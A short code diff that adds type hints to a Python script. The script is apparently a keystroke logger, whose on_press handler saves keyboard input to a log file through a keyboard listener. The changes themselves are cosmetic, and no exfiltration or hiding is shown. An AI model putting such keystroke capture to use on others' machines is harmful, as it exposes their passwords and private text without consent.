@@ -9,7 +9,7 @@ import time
 time_zero = time.time()
 
 
-def on_press(key):
+def on_press(key: Key) -> None:
     """
     Saves keyboard input into the log file
     """
@@ -31,7 +31,7 @@ def on_press(key):
         pass
 
 
-def main():
+def main() -> None:
     with Listener(on_press=on_press) as listener:
         listener.join()
 
